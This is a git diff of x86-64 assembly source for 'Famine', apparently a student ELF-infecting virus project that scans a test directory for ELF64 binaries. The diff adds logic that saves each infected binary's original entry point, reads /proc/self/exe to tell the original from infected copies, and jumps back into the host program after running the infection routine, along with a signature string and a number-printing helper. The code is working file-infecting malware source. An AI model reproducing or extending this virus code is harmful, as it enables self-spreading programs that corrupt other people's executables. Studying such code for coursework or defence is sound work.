@@ -59,18 +59,55 @@ section .text
 _start:
 	PUSH_ALL
 	jmp		end_
+print_rax:
+
+    PUSH_ALL
+
+    ; Utilisation d’un buffer sur la pile
+    sub     rsp, 32             ; réserver 32 bytes
+    lea     rsi, [rsp + 32]     ; rsi = fin du buffer
+    mov     rcx, 0              ; compteur de caractères
+    mov     rbx, rax            ; backup rax dans rbx
+
+.convert:
+    xor     rdx, rdx
+    mov     rax, rbx
+    mov     rdi, 10
+    div     rdi                ; rax = rbx / 10, rdx = reste
+    dec     rsi
+    add     dl, '0'
+    mov     [rsi], dl
+    mov     rbx, rax
+    inc     rcx
+    test    rax, rax
+    jnz     .convert
+
+    ; Affichage
+    mov     rax, 1              ; syscall write
+    mov     rdi, 1              ; stdout
+    mov     rdx, rcx            ; taille
+    syscall
+
+    add     rsp, 32             ; restaurer la pile
+    POP_ALL
+    ret
 
 	buff	times 4096 db 0
 	newl	times 0001 db 0xa
 	path	db '/root/famine/test_dir/', 0
 	padd	times 0512 db 0
 	file	db 'elf64 found!', 0
+	self	db '/proc/self/exe', 0
+	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
 	last	db '..', 0
 	curr	db '.', 0
 	elfh	db 0x7f, 'ELF'
 	one		db 1
+	zero	db 0
 	entry	dq 0
 	exec	dw 7
+	old_entry		   dq 0
+	new_entry		   dq 0
 	elfb	times 0064 db 0
 	elfp0	times 0056 db 0
 	elfp1	times 0056 db 0
@@ -417,6 +454,8 @@ _start:
 		jnz		.close_file
 		; END - CHECKS - ELF64
 
+		mov		rax, [rel elfb + 0x18]
+		mov		[old_entry], rax
 
 		movzx	rcx, word [rel elfb + 0x38]
 		movzx	rdi, word [rel elfb + 0x36]
@@ -580,9 +619,50 @@ _start:
 
 end_:
 
+	mov		rax, [rel entry]
+	mov		[rel new_entry], rax
+
 	call	famine
 
+	mov		rax, SYS_open
+	lea		rdi, [rel self]
+	xor		rsi, rsi
+	xor		rdx, rdx
+	syscall
+	cmp		rax, 0
+	jle		.just_quit
+	mov		r12, rax
+	; sys_pread64	unsigned long fd	char *buf	size_t count	loff_t pos
+
+	mov		rax, SYS_pread64
+	mov		rdi, r12
+	lea		rsi, [rel zero]
+	mov		rdx, 1
+	mov		r10, 10
+	syscall
+
+
+	mov		rax, SYS_close
+	mov		rdi, r12
+	syscall
+
+
+
+.just_quit:
 	POP_ALL
+
+	mov		al, BYTE [rel zero]
+	test	al, al
+	jz		.exit_ret
+
+	mov		rax, [rel new_entry]
+	sub		rax, [rel old_entry]
+	lea		rdi, [rel _start]
+	sub		rdi, rax
+	jmp		rdi
+
+.exit_ret:
+
 	mov		rax, SYS_exit
 	xor		rdi, rdi
 	syscall
